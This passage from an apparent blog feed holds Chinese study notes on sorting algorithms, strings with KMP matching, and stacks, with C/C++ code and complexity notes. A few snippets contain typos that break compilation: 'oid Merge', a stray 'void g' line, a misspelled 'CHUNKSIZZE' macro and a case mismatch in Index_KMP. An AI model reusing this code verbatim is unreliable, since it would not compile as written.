class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;=L.length<span class="number">-1</span>;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(L.r[j].key&gt;L.r[j+<span class="number">1</span>].key)&#123;</span><br><span class="line">                temp=L.r[j];</span><br><span class="line">                L.r[j]=L.r[j+<span class="number">1</span>];</span><br><span class="line">                L.r[j+<span class="number">1</span>]=temp;</span><br><span class="line">                noswap=<span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(noswap)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="comment">//起泡排序</span></span><br></pre></td></tr></table></figure><h5 id="算法分析-3"><a href="#算法分析-3" class="headerlink" title="算法分析"></a>算法分析</h5><p>1.稳定性：起泡排序是稳定的排序方法</p><p>2.时间复杂性</p><p>最好情况：比较$O(n)$，移动$O(1)$</p><p>最坏情况：比较$O(n^2)$，移动$O(n^2)$</p><p>平均情况：$O(n^2)$</p><p>3.空间复杂性：$O(1)$</p><h4 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h4><h5 id="算法思想-1"><a href="#算法思想-1" class="headerlink" title="算法思想"></a>算法思想</h5><p>任取待排序列中的某个对象v，以它关键字大小为基准将整个序列分为左右两个子序列：</p><p>左侧子序列中所有对象的关键字都小于或等于对象v的关键字</p><p>右侧子序列中所有对象的关键字都大于或等于对象v的关键字</p><p>对象v则排在这两个子序列中间（最终位置）</p><h5 id="算法实现-4"><a href="#算法实现-4" class="headerlink" title="算法实现"></a>算法实现</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">Partition</span><span class="params">(SqList &amp;L,<span class="type">int</span> low,<span class="type">int</span> high)</span></span>&#123;</span><br><span class="line">    KeyType pivotkey;</span><br><span class="line">    L.r[<span class="number">0</span>]=L.r[low];<span class="comment">//枢轴元素记录在r[0]</span></span><br><span class="line">    pivotkey=L.r[low].key;</span><br><span class="line">    RcdType temp;</span><br><span class="line">    <span class="keyword">while</span> (low&lt;high)&#123;</span><br><span class="line">        <span class="keyword">while</span>(low&lt;high&amp;&amp;(L.r[high].key&gt;=pivotkey))</span><br><span class="line">            --high;</span><br><span class="line">      L.r[low]=L.r[high];</span><br><span class="line">        <span class="keyword">while</span>(low&lt;high&amp;&amp;L.r[low].key&lt;=pivotkey)</span><br><span class="line">            ++low;</span><br><span class="line">      L.r[high]=L.r[low];</span><br><span class="line">    &#125;</span><br><span class="line">    L.r[low]=L.r[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">return</span> low;</span><br><span class="line">&#125;<span class="comment">//返回枢轴位置</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">QSort</span><span class="params">(SqList &amp;L,<span class="type">int</span> low,<span class="type">int</span> high)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> pivotloc;</span><br><span class="line">    <span class="keyword">if</span>(low&lt;high)&#123;</span><br><span class="line">        pivotloc=<span class="built_in">Partition</span>(L, low, high);</span><br><span class="line">        <span class="built_in">QSort</span>(L, low, pivotloc<span class="number">-1</span>);</span><br><span class="line">        <span class="built_in">QSort</span>(L, pivotloc+<span class="number">1</span>, high);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="comment">//快速排序</span></span><br></pre></td></tr></table></figure><h5 id="算法分析-4"><a href="#算法分析-4" class="headerlink" title="算法分析"></a>算法分析</h5><p>1.稳定性：快速排序不稳定</p><p>2.算法效率</p><p>最坏情况：时间复杂度$O(n^2)$，空间复杂度$O(n)$</p><p>最好情况：时间复杂度$O(nlog_2n)$，空间复杂度$O(log_2n)$</p><p>对于时间复杂性的最好情况来说，每次选择的基准是把左右分为相等的两部分；</p><p>最好情况的时间复杂度为$O(nlog_2n)$</p><p>平均时间复杂度也是$O(nlog_2n)$</p><h4 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h4><h5 id="算法思想-2"><a href="#算法思想-2" class="headerlink" title="算法思想"></a>算法思想</h5><p>1.第一次从个关键字中选择一个最小值，确定第一个；</p><p>2.第二次从剩余元素中再选择一个最小值，确定第二个</p><p>3.共n-1次选择</p><h5 id="算法实现-5"><a href="#算法实现-5" class="headerlink" title="算法实现"></a>算法实现</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">SelectSort</span><span class="params">(SqList &amp;L)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i,j,low;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;L.length;i++)&#123;</span><br><span class="line">        low=i;</span><br><span class="line">        <span class="keyword">for</span>(j=i+<span class="number">1</span>;j&lt;=L.length;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(L.r[j].key&lt;L.r[low].key)&#123;</span><br><span class="line">                low=j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(i!=low)&#123;</span><br><span class="line">            L.r[<span class="number">0</span>]=L.r[i];</span><br><span class="line">            L.r[i]=L.r[low];</span><br><span class="line">            L.r[low]=L.r[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="comment">//选择排序</span></span><br></pre></td></tr></table></figure><h4 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h4><h5 id="算法思想-3"><a href="#算法思想-3" class="headerlink" title="算法思想"></a>算法思想</h5><p>堆排序属于选择排序，出发点是利用选择排序已经发生过的比较，记住比较的结果，减少重复比较的次数。</p><p>堆的定义：</p><p>n个元素的关键字序列A[1].key，A[2].key，…，A[n].key,当且仅当满足下述关系时称为堆：</p><p>小根堆：</p><script type="math/tex; mode=display">\begin{cases}A[i].key \leqslant A[2*i].key \\且                           \\                                                    A[i].key \leqslant A[2*i+1].key\end{cases}</script><p>大根堆：</p><script type="math/tex; mode=display">\begin{cases}A[i].key \geqslant A[2*i].key \\且                           \\                                                    A[i].key \geqslant A[2*i+1].key\end{cases}</script><p>堆是一棵采用顺序存储结构的完全二叉树</p><p>堆的根结点是关键字序列中的最小（或最大）值，分别称为小（或大）根堆</p><p>堆排序需要解决的问题：</p><p>1.由一个无需序列建成一个堆</p><p>2.输出堆顶元素后，调整剩余的元素称为一个新的堆</p><h5 id="算法概要（采用大根堆）"><a href="#算法概要（采用大根堆）" class="headerlink" title="算法概要（采用大根堆）"></a>算法概要（采用大根堆）</h5><p>1.按关键字建立A[1],A[2],…,A[n]的大根堆</p><p>2.输出堆顶元素，采用堆顶元素A[1]与最后一个元素A[n]交换，最大元素得到正确的排序位置</p><p>3.此时，前n-1个元素不再满足堆的特性，需要重建堆</p><p>4.循坏执行2，3到排序完成</p><h5 id="算法实现-6"><a href="#算法实现-6" class="headerlink" title="算法实现"></a>算法实现</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">HeapType</span>&#123;</span><br><span class="line">    RcdType r[MAXSIZE+<span class="number">1</span>];</span><br><span class="line">    <span class="type">int</span> length;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">HeapAdjust</span><span class="params">(HeapType &amp;H,<span class="type">int</span> s,<span class="type">int</span> m)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> j;</span><br><span class="line">    RcdType rc;</span><br><span class="line">    rc=H.r[s];</span><br><span class="line">    <span class="keyword">for</span>(j=<span class="number">2</span>*s;j&lt;=m;j*=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(j&lt;m&amp;&amp;H.r[j].key&lt;H.r[j+<span class="number">1</span>].key)</span><br><span class="line">            ++j;</span><br><span class="line">        <span class="keyword">if</span>(rc.key&gt;=H.r[j].key) <span class="keyword">break</span>;</span><br><span class="line">        H.r[s]=H.r[j];</span><br><span class="line">        s=j;</span><br><span class="line">    &#125;</span><br><span class="line">    H.r[s]=rc;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">HeapSort</span><span class="params">(HeapType &amp;H)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    RcdType temp;</span><br><span class="line">    <span class="keyword">for</span>(i=H.length/<span class="number">2</span>;i&gt;<span class="number">0</span>;--i)&#123;</span><br><span class="line">        <span class="built_in">HeapAdjust</span>(H, i, H.length);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=H.length;i&gt;<span class="number">1</span>;--i)&#123;</span><br><span class="line">        temp=H.r[i];</span><br><span class="line">        H.r[i]=H.r[<span class="number">1</span>];</span><br><span class="line">        H.r[<span class="number">1</span>]=temp;</span><br><span class="line">        <span class="built_in">HeapAdjust</span>(H, <span class="number">1</span>, i<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="comment">//HeapSort</span></span><br></pre></td></tr></table></figure><p>总结：</p><p>1.将无序序列构成一个堆</p><p>2.将堆顶元素与末尾元素交换，将最大元素沉到数组末端</p><p>3.重新调整结构，并继续调整+交换</p><h5 id="算法分析-5"><a href="#算法分析-5" class="headerlink" title="算法分析"></a>算法分析</h5><p>1.堆排序是不稳定的排序</p><p>2.时间复杂度为：$O(nlog_2n)$</p><p>3.空间复杂度：$O(1)$</p><h4 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h4><p>将两多个有序表合成一个新的有序表</p><h5 id="算法实现-7"><a href="#算法实现-7" class="headerlink" title="算法实现"></a>算法实现</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">oid <span class="title">Merge</span><span class="params">(RcdType SR[], RcdType TR[], <span class="type">int</span> i, <span class="type">int</span> m, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> j, k;</span><br><span class="line">    <span class="keyword">for</span> (j = m + <span class="number">1</span>, k = i; i &lt;= m &amp;&amp; j &lt;= n; ++k) &#123;</span><br><span class="line">        <span class="keyword">if</span> (SR[i].key &lt; SR[j].key) TR[k] = SR[i++];</span><br><span class="line">        <span class="keyword">else</span> TR[k] = SR[j++];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (i &lt;= m) TR[k++] = SR[i++];</span><br><span class="line">    <span class="keyword">while</span> (j &lt;= n) TR[k++] = SR[j++];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Msort</span><span class="params">(RcdType A[], RcdType B[], <span class="type">int</span> n, <span class="type">int</span> d)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">1</span>, t;</span><br><span class="line">    <span class="keyword">while</span> (i + <span class="number">2</span> * d - <span class="number">1</span> &lt;= n) &#123;</span><br><span class="line">        <span class="built_in">Merge</span>(A, B, i, i + d - <span class="number">1</span>, i + <span class="number">2</span> * d - <span class="number">1</span>);</span><br><span class="line">        i = i + <span class="number">2</span> * d;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (i + d - <span class="number">1</span> &lt;= n) &#123;</span><br><span class="line">        <span class="built_in">Merge</span>(A, B, i, i + d - <span class="number">1</span>, n);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (t = i; t &lt;= n; t++) &#123;</span><br><span class="line">            B[t] = A[t];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MergeSort</span><span class="params">(RcdType A[], <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> d = <span class="number">1</span>;</span><br><span class="line">    RcdType *B = (RcdType *)<span class="built_in">malloc</span>((n + <span class="number">1</span>) * <span class="built_in">sizeof</span>(RcdType));</span><br><span class="line">    <span class="keyword">while</span> (d &lt; n) &#123;</span><br><span class="line">        <span class="built_in">Msort</span>(A, B, n, d);</span><br><span class="line">        d = <span class="number">2</span> * d;</span><br><span class="line">        <span class="built_in">Msort</span>(B, A, n, d);</span><br><span class="line">        d = <span class="number">2</span> * d;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(B);</span><br><span class="line">&#125;<span class="comment">//归并排序</span></span><br></pre></td></tr></table></figure><h5 id="算法分析-6"><a href="#算法分析-6" class="headerlink" title="算法分析"></a>算法分析</h5><p>1.归并排序是稳定的排序方法</p><p>2.时间复杂度$nlog_2n$</p><p>3.空间复杂度$O(n)$</p><h4 id="基数排序"><a href="#基数排序" class="headerlink" title="基数排序"></a>基数排序</h4><p>基数排序起源于桶排序，把关键词为k的记录放在第k个箱子里，按按序号将非空的记录收集起来</p><p>缺点是：如果关键字位数太大这样做空间复杂性和时间复杂性都大大提高</p><h5 id="算法实现-8"><a href="#算法实现-8" class="headerlink" title="算法实现"></a>算法实现</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">records</span>&#123;</span><br><span class="line">    <span class="type">int</span> key;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">celltype</span>&#123;</span><br><span class="line">    records data;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">celltype</span> *next;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">QUEUE</span>&#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">celltype</span> *front;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">celltype</span> *rear;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MAKENULL</span><span class="params">(QUEUE &amp;Q)</span></span>&#123;</span><br><span class="line">    Q.front=Q.rear=(celltype*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(celltype));</span><br><span class="line">    <span class="keyword">if</span>(!Q.front)&#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    Q.front-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">records <span class="title">FRONT</span><span class="params">(QUEUE Q)</span></span>&#123;</span><br><span class="line">    records e;</span><br><span class="line">    e.key=<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span> (Q.front-&gt;next != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">        celltype* p= Q.front-&gt;next;</span><br><span class="line">        e.key=p-&gt;data.key;</span><br><span class="line">        <span class="keyword">return</span> e;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> e;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">EMPTY</span><span class="params">(QUEUE Q)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Q.front==Q.rear)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ENQUEUE</span><span class="params">(records e,QUEUE &amp;Q)</span></span>&#123;</span><br><span class="line">    celltype* p;</span><br><span class="line">    p=(celltype*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(celltype));</span><br><span class="line">    <span class="keyword">if</span>(!p)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    p-&gt;data=e;</span><br><span class="line">    p-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">    Q.rear-&gt;next=p;</span><br><span class="line">    Q.rear=p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DEQUEUE</span><span class="params">(QUEUE &amp;Q)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Q.front==Q.rear)&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;ERROR.&quot;</span>&lt;&lt;endl;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    celltype *p;</span><br><span class="line">    p=Q.front-&gt;next;</span><br><span class="line">    <span class="comment">//e=p-&gt;data;</span></span><br><span class="line">    Q.front-&gt;next=p-&gt;next;</span><br><span class="line">    <span class="keyword">if</span>(Q.rear==p)</span><br><span class="line">    &#123;</span><br><span class="line">        Q.rear=Q.front;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;DeQueue succeed.&quot;</span>&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">RADIX</span><span class="params">(<span class="type">int</span> k,<span class="type">int</span> p)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ((<span class="type">int</span>)(k/<span class="built_in">pow</span>(<span class="number">10</span>,p<span class="number">-1</span>))%<span class="number">10</span>);</span><br><span class="line">&#125;<span class="comment">//求关键字k的第p位</span></span><br><span class="line"><span class="comment">//个：k%10</span></span><br><span class="line"><span class="comment">//十：k/10%10</span></span><br><span class="line"><span class="comment">//百：k/100%10</span></span><br><span class="line"><span class="comment">//千：k/1000%10</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">radixsort</span><span class="params">(<span class="type">int</span> figure,QUEUE &amp;A)</span></span>&#123;</span><br><span class="line">    QUEUE Q[<span class="number">10</span>];</span><br><span class="line">    records data;</span><br><span class="line">    <span class="type">int</span> pass,r,i;</span><br><span class="line">    <span class="keyword">for</span>(pass=<span class="number">1</span>;pass&lt;=figure;pass++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=<span class="number">9</span>;++i)&#123;</span><br><span class="line">            <span class="built_in">MAKENULL</span>(Q[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(!<span class="built_in">EMPTY</span>(A))&#123;</span><br><span class="line">            data=<span class="built_in">FRONT</span>(A);</span><br><span class="line">            <span class="built_in">DEQUEUE</span>(A);</span><br><span class="line">            r=<span class="built_in">RADIX</span>(data.key,pass);</span><br><span class="line">            <span class="built_in">ENQUEUE</span>(data,Q[r]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=<span class="number">9</span>;++i)&#123;</span><br><span class="line">            <span class="keyword">while</span>(!<span class="built_in">EMPTY</span>(Q[i]))&#123;</span><br><span class="line">                data=<span class="built_in">FRONT</span>(Q[i]);</span><br><span class="line">                <span class="built_in">DEQUEUE</span>(Q[i]);</span><br><span class="line">                <span class="built_in">ENQUEUE</span>(data, A);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="comment">//基数排序</span></span><br></pre></td></tr></table></figure><h3 id="排序方法比较"><a href="#排序方法比较" class="headerlink" title="排序方法比较"></a>排序方法比较</h3><p><img src="/2023/11/23/排序方法比较.png" alt="排序方法比较"></p>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【数据结构】 串</title>
      <link href="/2023/11/23/"/>
      <url>/2023/11/23/</url>
      
        <content type="html"><![CDATA[<h3 id="串"><a href="#串" class="headerlink" title="串"></a>串</h3><h4 id="串的定义"><a href="#串的定义" class="headerlink" title="串的定义"></a>串的定义</h4><p>串是由零个或多个字符组成的有限序列，记作：s=”$a_1a_2…a_n$”</p><p>其中，s是串的名，用双引号括起来的字符序列是串的值。</p><p>串长度：串中字符的数目n</p><p>空串：长度为零的串</p><p>子串：串中任意个连续的字符组成的子序列</p><p>主串：包含子串的串相应地称为主串</p><p>串相等：当两个串长度相等，且每个对应位置的字符都相等</p><p>空格串（空白串）：由一个或多个空格组成的串。要和“空串”区别，空格串有长度，就是空格的个数</p><h4 id="串的抽象数据类型的定义"><a href="#串的抽象数据类型的定义" class="headerlink" title="串的抽象数据类型的定义"></a>串的抽象数据类型的定义</h4><p>ADT String{</p><p>​    数据对象：D={$a_i$|$a_i \in$ CharacterSet,i=1,2,..,n, n$\geqslant$0}</p><p>​    数据关系：R={&lt;$a_{i-1}$,$a_i$&gt;|$a_{i-1}$,$a_i\in$D,i=2,3,…,n}</p><p>​    基本操作：</p><p>​        StrAssign(&amp;T,chars)    //根据串常量chars生成串T</p><p>​        DestrString(&amp;S)        //销毁串S</p><p>​        StrCopy(&amp;T,S)    //把串S中内容拷贝到T串</p><p>​        StrLength(S)     //求串长</p><p>​        StrCompare(S,T)  //比较串S和T</p><p>​        Concat(&amp;T,S1,S2)    //连接串</p><p>​        StrEmpty(S)        //判断串是否为空</p><p>​        SubString(&amp;Sub,S,pos,len)    //求子串</p><p>​        ClearString(&amp;S)     //清空串</p><p>​        Index(S,T,pos)    //子串定位</p><p>​        Replace(&amp;S,T,V)   //把串S中符合T的子串替换</p><p>​        StrInsert(&amp;S,pos,T)    //插入子串</p><p>​        StrDelete(&amp;S,pos,len)    //删除子串</p><p>}</p><h4 id="串的表示"><a href="#串的表示" class="headerlink" title="串的表示"></a>串的表示</h4><h5 id="定长顺序存储表示"><a href="#定长顺序存储表示" class="headerlink" title="定长顺序存储表示"></a>定长顺序存储表示</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAXSTRLEN 255</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">char</span> Sstring[MAXSTRLEN+<span class="number">1</span>]</span><br><span class="line">Sstring S;</span><br></pre></td></tr></table></figure><h5 id="堆分配存储表示"><a href="#堆分配存储表示" class="headerlink" title="堆分配存储表示"></a>堆分配存储表示</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line"><span class="type">char</span> *ch;</span><br><span class="line"><span class="type">int</span> length;</span><br><span class="line">&#125;HString;</span><br></pre></td></tr></table></figure><h5 id="串的块链存储表示"><a href="#串的块链存储表示" class="headerlink" title="串的块链存储表示"></a>串的块链存储表示</h5><p>字符串本身是一个线性表，可以用链表存储</p><p>若用普通链表存储，存储密度低，浪费空间严重</p><p>解决办法：一个结点存储多个字符——即串的块链存储</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> CHUNKSIZZE 80</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">Chunk</span>&#123;</span><br><span class="line"><span class="type">char</span> ch[CHUNKSIZE];</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Chunk</span> *next;</span><br><span class="line">&#125;Chunk;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">Chunk *head,*tail;</span><br><span class="line"><span class="type">int</span> curlen;</span><br><span class="line">&#125;LString;</span><br></pre></td></tr></table></figure><h4 id="模式匹配简单算法"><a href="#模式匹配简单算法" class="headerlink" title="模式匹配简单算法"></a>模式匹配简单算法</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">Index</span><span class="params">(Sstring S,Sstring T,<span class="type">int</span> pos)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i,j;</span><br><span class="line">    i=pos;</span><br><span class="line">    j=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=S[<span class="number">0</span>]&amp;&amp;j&lt;=T[<span class="number">0</span>])&#123;</span><br><span class="line">        <span class="keyword">if</span>(S[i]==T[j])</span><br><span class="line">        &#123;</span><br><span class="line">            ++i;</span><br><span class="line">            ++j;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            i=i-j+<span class="number">2</span>;</span><br><span class="line">            j=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(j&gt;T[<span class="number">0</span>]) <span class="keyword">return</span> i-T[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;<span class="comment">//Index</span></span><br></pre></td></tr></table></figure><p>最好的情况的平均复杂度为$O(n+m)$</p><p>最坏的情况的平均复杂度为$O(n*m)$</p><h4 id="模式匹配KMP算法"><a href="#模式匹配KMP算法" class="headerlink" title="模式匹配KMP算法"></a>模式匹配KMP算法</h4><script type="math/tex; mode=display">next[j]=\begin{cases}max \{k|1<k<j，且t_1...t_{k-1}==t_{j-k+1}...t_{j-1}\} 当此集合非空时\\0 ,当j=1时\\1 其他情况\end{cases}</script><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> next[<span class="number">10</span>];</span><br><span class="line"><span class="function"><span class="type">void</span> g</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Index_KMP</span><span class="params">(Sstring S,Sstring T,<span class="type">int</span> pos)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> i,j;</span><br><span class="line">  i=pos;j=<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span>(i&lt;=S[<span class="number">0</span>]&amp;&amp;j&lt;=T[<span class="number">0</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(j==<span class="number">0</span>||S[i]==T[j])&#123;</span><br><span class="line">    i++;</span><br><span class="line">    j++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> j=next[j];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(j&gt;t[<span class="number">0</span>]) <span class="keyword">return</span> i-t[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【数据结构】 栈和队列</title>
      <link href="/2023/11/23/"/>
      <url>/2023/11/23/</url>
      
        <content type="html"><![CDATA[<h3 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h3><h4 id="栈的定义"><a href="#栈的定义" class="headerlink" title="栈的定义"></a>栈的定义</h4><p>栈(Stack)是一种特殊的线性表，其插入和删除操作均在表的一端进行，是一种运算受限的线性表</p><p>栈顶(top)是栈中允许插入和删除的一端</p><p>栈底(bottom)是栈顶的另一端</p><h4 id="栈的抽象数据类型"><a href="#栈的抽象数据类型" class="headerlink" title="栈的抽象数据类型"></a>栈的抽象数据类型</h4><p>ADT Stack{</p><p>​    数据对象：D={$a_i$|$a_i$ $\in$ElemSet ,i=1,2,…,n n$\geqslant$0}</p><p>​    数据关系：R={&lt;$a_{i-1}$,$a_i$&gt;,$a_i \in D$,i=2,…,n}</p><p>​                        约定$a_n$为栈顶，$a_1$为栈底</p><p>​    基本操作：</p><p>​        InitStack(&amp;S)    //初始化栈</p><p>​        DestoryStack(&amp;S)    //销毁栈</p><p>​        ClearStack(&amp;S)    //清空栈</p><p>​        StackEmpty(S)    //判断栈是否为空</p><p>​        StackLength(S)    //求栈长度</p><p>​        GetTop(S,&amp;e)    //取栈顶元素</p><p>​        Push(&amp;S,e)    //入栈</p><p>​        Pop(&amp;S,&amp;e)    //出栈</p><p>​        StackTraverse(S,visit())    //遍历栈</p><p>}ADT Stack</p><h4 id="顺序栈存储结构实现"><a href="#顺序栈存储结构实现" class="headerlink" title="顺序栈存储结构实现"></a>顺序栈存储结构实现</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> SElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">    SElemType *base;</span><br><span class="line">    SElemType *top;</span><br><span class="line">    <span class="type">int</span> stacksize;</span><br><span class="line">&#125;SqStack;</span><br></pre></td></tr></table></figure><h4 id="顺序栈的操作实现"><a href="#顺序栈的操作实现" class="headerlink" title="顺序栈的操作实现"></a>顺序栈的操作实现</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STACK_INIT_SIZE 100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STACKINCREMENT 10</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> SElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">    SElemType *base;</span><br><span class="line">    SElemType *top;</span><br><span class="line">    <span class="type">int</span> stacksize;</span><br><span class="line">&#125;SqStack;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InitStack</span><span class="params">(SqStack &amp;S)</span></span>&#123;</span><br><span class="line">    S.base=(SElemType*)<span class="built_in">malloc</span>(STACK_INIT_SIZE*<span class="built_in">sizeof</span>(SElemType));</span><br><span class="line">    <span class="keyword">if</span>(!S.base) <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    S.top=S.base;</span><br><span class="line">    S.stacksize=STACK_INIT_SIZE;</span><br><span class="line">    